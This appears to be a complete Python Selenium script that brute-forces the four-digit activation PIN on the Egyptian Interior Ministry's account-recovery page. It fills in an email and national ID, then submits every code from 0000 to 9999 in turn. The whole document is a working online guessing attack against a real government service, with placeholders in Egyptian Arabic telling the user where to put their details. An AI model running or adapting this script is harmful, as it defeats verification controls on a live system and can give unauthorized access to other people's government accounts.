from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
import time

options = Options()

cService = webdriver.ChromeService(executable_path='./chromedriver')
driver = webdriver.Chrome(service = cService)

driver.get("https://moi.gov.eg/Account/ForgotActivationCode")

Mail = "أكتب إيميلك هنا"
ID = "أكتب الرقم القومي بتاعك هنا"

Mail1 = driver.find_element(By.CSS_SELECTOR, "#Email")
Mail1.send_keys(Mail)
ID1 = driver.find_element(By.CSS_SELECTOR, "#Identity")
ID1.send_keys(ID)

def reg():
    for i in range(10000):
        Code = str(i).zfill(4)
        Code1 = driver.find_element(By.CSS_SELECTOR, '#PinCode'); Code1.click()
        Code1.send_keys(Code)
        driver.find_element(By.CSS_SELECTOR, '#CodeModal > div.modal-body > div > i').click()
        driver.find_element(By.CSS_SELECTOR, '#ActivationForm > div:nth-child(5) > button').click()
        time.sleep(1)
        Code1.clear()

reg()